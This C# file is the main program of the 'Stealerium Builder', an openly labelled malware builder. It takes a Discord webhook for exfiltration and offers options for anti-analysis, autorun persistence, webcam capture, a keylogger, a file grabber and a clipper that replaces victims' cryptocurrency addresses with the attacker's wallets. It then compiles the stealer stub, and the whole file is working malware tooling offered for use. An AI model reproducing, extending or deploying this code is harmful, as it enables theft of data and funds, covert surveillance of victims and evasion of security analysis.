/*
 * Stealerium Builder - Main Program
 * 
 * 🔥 Enhanced by @chocolaid on GitHub
 * 
 * Features Added:
 * - USDT clipper support with validation
 * - Settings persistence system integration
 * - Wallet validation for all supported cryptocurrencies
 * - Enhanced webhook validation with pattern matching
 * 
 * "Building malware like a true professional" 💀
 */

using Builder.Modules;
using Builder.Modules.build;

namespace Builder;

internal class Program
{
    [STAThread]
    private static void Main()
    {
        // Load previous settings
        var settings = Settings.LoadSettings();
        
        // Settings
        var token = Cli.GetWebhookValue("Discord webhook url", settings.Webhook);
        // Test connection to Discord webhook url
        if (!Discord.WebhookIsValid(token))
            Cli.ShowError("Check the fucking webhook url!");
        else
            Discord.SendMessage("✅ *Stealerium* builder connected successfully!", token);
        Cli.ShowSuccess("Connected successfully!\n");

        // Encrypt values
        Build.ConfigValues["Webhook"] = Crypt.EncryptConfig(token);
        // Debug mode (write all exceptions to file)
        Build.ConfigValues["Debug"] = Cli.GetBoolValue("Debug all exceptions to file ?", settings.Debug);
        // Installation
        Build.ConfigValues["AntiAnalysis"] = Cli.GetBoolValue("Use anti analysis?", settings.AntiAnalysis);
        Build.ConfigValues["Startup"] = Cli.GetBoolValue("Install autorun?", settings.Startup);
        Build.ConfigValues["StartDelay"] = Cli.GetBoolValue("Use random start delay?", settings.StartDelay);
        // Modules
        Build.ConfigValues["WebcamScreenshot"] = Cli.GetBoolValue("Create webcam screenshots?", settings.WebcamScreenshot);
        Build.ConfigValues["Keylogger"] = Cli.GetBoolValue("Install keylogger?", settings.Keylogger);
        Build.ConfigValues["Clipper"] = Cli.GetBoolValue("Install clipper?", settings.Clipper);
        Build.ConfigValues["Grabber"] = Cli.GetBoolValue("File Grabber ?", settings.Grabber);

        // Clipper addresses
        
        Build.ConfigValues["ClipperBTC"] = Cli.GetValidatedWallet("Clipper : Your bitcoin address", "bitcoin", settings.ClipperBTC);
        Build.ConfigValues["ClipperETH"] = Cli.GetValidatedWallet("Clipper : Your etherium address", "ethereum", settings.ClipperETH);
        Build.ConfigValues["ClipperLTC"] = Cli.GetValidatedWallet("Clipper : Your litecoin address", "litecoin", settings.ClipperLTC);
        Build.ConfigValues["ClipperUSDT"] = Cli.GetValidatedWallet("Clipper : Your USDT address", "usdt", settings.ClipperUSDT);
    

        // Save current settings for next time
        var currentSettings = new SettingsData
        {
            Webhook = token,
            Debug = Build.ConfigValues["Debug"],
            AntiAnalysis = Build.ConfigValues["AntiAnalysis"],
            Startup = Build.ConfigValues["Startup"],
            StartDelay = Build.ConfigValues["StartDelay"],
            WebcamScreenshot = Build.ConfigValues["WebcamScreenshot"],
            Keylogger = Build.ConfigValues["Keylogger"],
            Clipper = Build.ConfigValues["Clipper"],
            Grabber = Build.ConfigValues["Grabber"],
            ClipperBTC = Build.ConfigValues["ClipperBTC"],
            ClipperETH = Build.ConfigValues["ClipperETH"],
            ClipperLTC = Build.ConfigValues["ClipperLTC"],
            ClipperUSDT = Build.ConfigValues["ClipperUSDT"]
        };
        Settings.SaveSettings(currentSettings);

        // Build
        var build = Build.BuildStub();

        // Done
        Cli.ShowSuccess("Stub: " + build + " saved.");
        Console.ReadLine();
    }
}